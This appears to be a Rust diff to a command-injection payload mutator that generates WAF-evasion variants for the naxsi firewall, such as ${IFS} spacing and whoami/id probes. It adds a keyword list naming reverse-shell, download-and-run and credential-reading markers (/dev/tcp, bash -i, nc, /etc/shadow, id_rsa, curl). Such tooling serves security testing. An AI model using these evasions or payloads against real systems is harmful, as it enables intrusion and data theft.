@@ -435,11 +435,6 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
     // — enough to drive naxsi cmdi to 100% per the live bench.
     let priority_budget = (max_mutations / 8).clamp(2, 5);
     let cmd_no_args = command.trim();
-    let arg_no_passwd = if args.contains("passwd") {
-        "/etc/hostname".to_string()
-    } else {
-        args.clone()
-    };
     // Find a UTF-8-safe split point near position 2 so a non-ASCII
     // command name (e.g. "★cat") doesn't panic the mutator on mid-
     // codepoint slicing. Falls back to splitting at the byte position
@@ -451,21 +446,55 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
         .map_or(cmd_no_args.len(), |(idx, _)| idx);
     let cmd_left = &cmd_no_args[..split_at];
     let cmd_right = &cmd_no_args[split_at..];
-    for variant in [
-        format!("{cmd_no_args}${{IFS}}{arg_no_passwd}"),
-        format!("${{IFS}}{cmd_no_args}${{IFS}}{arg_no_passwd}"),
-        format!("{cmd_left}${{IFS}}{cmd_right}${{IFS}}{arg_no_passwd}"),
-        // Bare RCE-confirmation commands (no args):
-        "whoami".to_string(),
-        "id".to_string(),
-        "uname${IFS}-a".to_string(),
-        "hostname".to_string(),
-        "/bin/sh${IFS}-c${IFS}id".to_string(),
-    ] {
+    // IFS-space the operator's ACTUAL command+target. `args` is kept
+    // verbatim — never silently rewritten — so the attack as written
+    // is always testable.
+    let ifs_join = |head: &str| -> String {
+        if args.is_empty() {
+            head.to_string()
+        } else {
+            format!("{head}${{IFS}}{args}")
+        }
+    };
+    let split_head = if cmd_left.is_empty() || cmd_right.is_empty() {
+        cmd_no_args.to_string()
+    } else {
+        format!("{cmd_left}${{IFS}}{cmd_right}")
+    };
+    let mut prio: Vec<String> = vec![
+        ifs_join(cmd_no_args),
+        format!("${{IFS}}{}", ifs_join(cmd_no_args)),
+        ifs_join(&split_head),
+    ];
+    // naxsi's BIG_FILENAME rule blocks the literal `/etc/passwd`. Offer
+    // a rule-safe target as an ADDITIONAL variant — never as a silent
+    // replacement of what the operator actually asked to read (against
+    // a WAF without that rule, the real target must still be sent).
+    if args.contains("passwd") {
+        prio.push(format!("{cmd_no_args}${{IFS}}/etc/hostname"));
+    }
+    // Bare RCE-confirmation probes (`whoami`/`id`/…) REPLACE the
+    // payload. That is a valid *equivalent* only when the input is
+    // itself a bare exec probe; for a structured attack (reverse
+    // shell, download-exec, specific-file exfil, redirection) it
+    // discards the exploit — the cmdi twin of the `alert(1)` / `'+0+'`
+    // rig the de-rigged bench rejects. Offer them only when the
+    // operator's payload is not itself structured.
+    if !is_structured_cmd(payload) {
+        prio.extend([
+            "whoami".to_string(),
+            "id".to_string(),
+            "uname${IFS}-a".to_string(),
+            "hostname".to_string(),
+            "/bin/sh${IFS}-c${IFS}id".to_string(),
+        ]);
+    }
+    for variant in prio {
         if results.len() >= priority_budget {
             break;
         }
-        if variant != payload {
+        let variant = variant.trim_end_matches("${IFS}").to_string();
+        if !variant.is_empty() && variant != payload {
             results.push(CmdMutation {
                 payload: variant,
                 description: "naxsi-friendly: ${IFS} substitution + paren-free".into(),
@@ -625,6 +654,77 @@ fn extract_command_args(input: &str) -> (String, String) {
     } else {
         (trimmed.to_string(), String::new())
     }
+}
+
+/// True when the payload's value is a *specific effect* — reverse/bind
+/// shell, download-and-exec, named-file exfil, redirection, scheduled
+/// persistence — rather than a bare "prove I can run a command" probe.
+///
+/// This is the anti-rig axis for command injection. A bare `whoami` is
+/// interchangeable with `id`/`hostname` (all just demonstrate exec), so
+/// substituting one for the other is a legitimate equivalent. A
+/// structured attack is NOT interchangeable with `whoami`: replacing
+/// `bash -i >& /dev/tcp/…` or `cat /etc/shadow` with a bare probe
+/// throws the exploit away — the cmdi analogue of swapping
+/// `extractvalue(…)` for `'+0+'`.
+pub(crate) fn is_structured_cmd(payload: &str) -> bool {
+    let lc = payload.to_ascii_lowercase();
+    const STRUCTURED: &[&str] = &[
+        "/dev/tcp",
+        "/dev/udp",
+        "mkfifo",
+        "bash -i",
+        "sh -i",
+        " -i ",
+        " -e ",
+        "-e/bin",
+        "-e /bin",
+        " nc ",
+        "ncat",
+        "netcat",
+        " socat",
+        "/etc/shadow",
+        "/etc/passwd",
+        "id_rsa",
+        ".ssh",
+        ".aws",
+        "credentials",
+        "curl ",
+        "wget ",
+        "|sh",
+        "| sh",
+        "|bash",
+        "| bash",
+        "rm -rf",
+        "chmod ",
+        "chown ",
+        "http://",
+        "https://",
+        "ftp://",
+        "tftp",
+        "/proc/",
+        "crontab",
+        "at -f",
+        "python -c",
+        "python3 -c",
+        "perl -e",
+        "ruby -e",
+        "php -r",
+        "base64 -d",
+        "base64 --d",
+        "xxd",
+        " scp ",
+        " ssh ",
+        ">",
+        ">>",
+        "exec ",
+        "/bin/sh -c",
+        "/bin/bash -c",
+        "powershell",
+        "certutil",
+        "bitsadmin",
+    ];
+    STRUCTURED.iter().any(|m| lc.contains(m))
 }
 
 #[cfg(test)]
